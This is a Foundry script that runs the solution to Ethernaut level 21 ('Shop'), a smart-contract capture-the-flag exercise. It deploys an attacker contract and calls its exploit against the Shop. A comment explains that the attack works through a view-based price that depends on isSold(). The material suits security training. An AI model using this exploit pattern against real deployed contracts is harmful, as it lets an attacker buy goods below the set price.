// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

import { console } from "forge-std/console.sol";
import { Script } from "forge-std/Script.sol";
import { IShop } from "ethernaut/21-shop/IShop.sol";
import { ShopAttacker } from "ethernaut/21-shop/ShopAttacker.sol";

contract ShopScript is Script {
    function run() external {
        // Get signer
        string memory mnemonic = vm.envString("MNEMONIC");
        uint256 deployerPrivateKey = vm.deriveKey(mnemonic, 1);
        vm.startBroadcast(deployerPrivateKey);

        // Load contract at address
        address shopAddr = vm.envAddress("L21_SHOP_ADDRESS");
        IShop shop = IShop(shopAddr);

        // Step 1: deploy attacker
        ShopAttacker shopAttacker = new ShopAttacker();

        // Step 2: exploit via `Shop.buy()`
        // NB: `price()` makes a `staticcall` (cause it is `view`) to `Shop.isSold()` & returns a value according to it
        shopAttacker.exploit(address(shop));

        console.logUint(shop.price());
        console.logBool(shop.isSold());

        vm.stopBroadcast();
    }
}
